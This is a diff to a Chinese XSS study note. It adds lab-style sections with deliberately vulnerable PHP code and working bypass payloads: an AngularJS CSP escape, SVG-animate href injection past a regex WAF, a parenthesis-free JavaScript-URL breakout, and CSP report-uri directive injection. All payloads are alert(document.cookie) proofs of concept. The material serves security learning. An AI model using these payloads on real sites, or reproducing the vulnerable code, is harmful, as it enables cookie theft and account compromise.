@@ -560,6 +560,105 @@ AngularJS 沙箱使用 charAt 检查标识符是否合法（防止使用危险�
 ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)=1
 ```
 
+### AngularJS CSP 绕过
+#### 漏洞源码
+CSP 设置在页面头部
+```php
+header("Content-Security-Policy: default-src 'self'; script-src 'self' https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src-elem 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self' https://ajax.googleapis.com; object-src 'none'; base-uri 'self'");
+```
+页面引入 AngularJS 1.4.4 并在 body 上启用 `ng-app`
+```html
+<body ng-app>
+    <div id="content"><?php echo $render; ?></div>
+<body>
+```
+反射逻辑对 `search` 做一次 URL 解码后直接输出到 DOM（位于 Angular 作用域内）
+```php
+$render = urldecode($search);
+```
+自动触发逻辑：同源外部脚本在加载后尝试聚焦 `id=x` 的元素（用于触发 `ng-focus` 表达式）
+```javascript
+document.addEventListener('DOMContentLoaded', function () {
+  setTimeout(function () {
+    var el = document.getElementById('x');
+    if (el && typeof el.focus === 'function') { try { el.focus(); } catch (e) {} }
+  }, 50);
+});
+```
+#### 绕过思路
+- 构造一个可聚焦的元素并在其 `ng-focus` 中注入表达式：
+  - `$event.composedPath()`: 这是一个标准的 Web API，返回事件触发时的路径（即从目标元素到 Window 对象的节点数组）
+  - `|`: 在 AngularJS 中，这表示过滤器。它会将左侧的结果（即节点数组）作为参数传递给右侧的过滤器函数
+  - `orderBy`: 这是 AngularJS 内置的一个强大过滤器。它的本意是给数组排序，但为了实现排序，它会对传入的表达式进行复杂的解析和执行
+  - `orderBy:'...'`: orderBy 允许传入一个字符串作为排序键。AngularJS 会动态解析这个字符串并执行它
+  - `(z=alert)`: 将全局函数 alert 赋值给变量 z
+  - `(document.cookie)`: 紧接着调用 z（即调用 alert），并将 document.cookie 作为参数传入
+- 由于表达式由 Angular 在模板编译时执行，不属于内联 `<script>`，因此不会被 `script-src` 拦截；聚焦由同源外部脚本触发，符合 CSP
+#### Payload
+```
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
+```
+
+### SVG 动画驱动 href 注入绕过
+#### 漏洞源码
+读取输入与 WAF 检测
+```php
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+if ($search) {
+    $s = strtolower($search);
+    if (preg_match('/\bon\w+\s*=/i', $s)) {
+        http_response_code(400);
+        die('Blocked: event handlers not allowed');
+    }
+    if (preg_match('/\bhref\s*=/i', $s)) {
+        http_response_code(400);
+        die('Blocked: href attribute not allowed');
+    }
+}
+```
+#### 绕过思路
+- WAF 使用的是基于输入字符串的浅层匹配：
+    - `on\w+=` 拦截内联事件属性（如 `onclick=`）
+    - `href=` 拦截显式的 `href` 赋值
+  - 但**不会识别 SVG/SMIL 的“动态属性赋值”语义**，例如 `<animate>` 的 `attributeName` 与 `values` 在渲染期为目标元素设置属性值，从而绕过对输入中“直接出现的 href=”的检测
+- 构造 SVG 结构，使用 `<animate>` 在渲染阶段为 `<a>` 动态设置 `href`：
+  - `<a>` 起初不包含 `href=`（因此 WAF 不命中）
+  - `<animate attributeName=href values=javascript:alert(document.cookie)>` 在解析/动画阶段将 `href` 写入为 `javascript:alert(document.cookie)`
+  - 用户点击 `<text>` 触发链接，执行 `javascript:` 代码
+#### Payload
+```html
+<svg><a><animate attributeName=href values=javascript:alert(document.cookie) /><text x=20 y=20>Click me</text></a>
+```
+
+### JS 字符串拼接 + 注释绕过
+#### 漏洞源码
+用户输入被直接拼接到 fetch 的 body 参数
+```html
+<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&<?php echo $q; ?>'}).finally(_=>window.location='/')">Back to Blog</a>
+```
+输入参数与字符限制（WAF）：禁止空白字符与圆括号，使用浅层正则匹配判断是否阻断
+```php
+$q = isset($_GET['q']) ? $_GET['q'] : '';
+$blocked = false;
+if ($q !== '') {
+    if (preg_match('/[\s]/', $q)) $blocked = true;
+    if (preg_match('/[()]/', $q)) $blocked = true;
+}
+```
+#### 绕过思路
+- 目标是在 JavaScript URL 的上下文中执行任意代码，同时满足以下限制：
+  - 不能使用空格（以 `/**/` 注释替代空格）
+  - 不能使用圆括号（使用隐式类型转换触发执行）
+- 利用链路：
+  - `'},`: 闭合前面的字符串 `'` 和对象 `}`。使用逗号 , 告诉 JS 引擎：后面还有其他的表达式需要计算
+  - `x=x=>{throw/**/onerror=alert,document.cookie}`: 定义一个恶意函数 x。该函数会将全局错误处理函数 onerror 改为 alert，然后抛出异常
+  - `toString=x, window+''`: 将 window.toString 指向恶意函数。当 window + '' 发生时，JS 会自动调用 toString 进行类型转换，从而执行函数
+  - `,{x:'`: 开启一个新的对象，并留下一个未闭合的单引号，用来吞掉原代码中剩下的 `'}).finally(...)`，保证整段 JS 语法合法
+#### Payload
+```
+'},x=x=>{throw/**/onerror=alert,document.cookie},toString=x,window+'',{x:'
+```
+
 ### 
 
 ## XSS 实战
@@ -755,6 +854,25 @@ $text = htmlspecialchars($c['text']);
 http://foo?&apos;-alert(document.cookie)-&apos;
 ```
 
+
+### CSP 拼接绕过
+#### 漏洞源码
+CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令
+`script-src 'self'` 禁止内联脚本，导致 `<script>alert(document.cookie)</script>` 不执行
+```php
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+$token = isset($_GET['token']) ? $_GET['token'] : '';
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
+```
+#### 绕过思路
+- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
+- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
+- 将脚本作为 `search` 反射到页面
+#### Payload
+```html
+<script>alert(document.cookie)</script>
+;script-src-elem 'unsafe-inline'
+```
 
 ### 
 
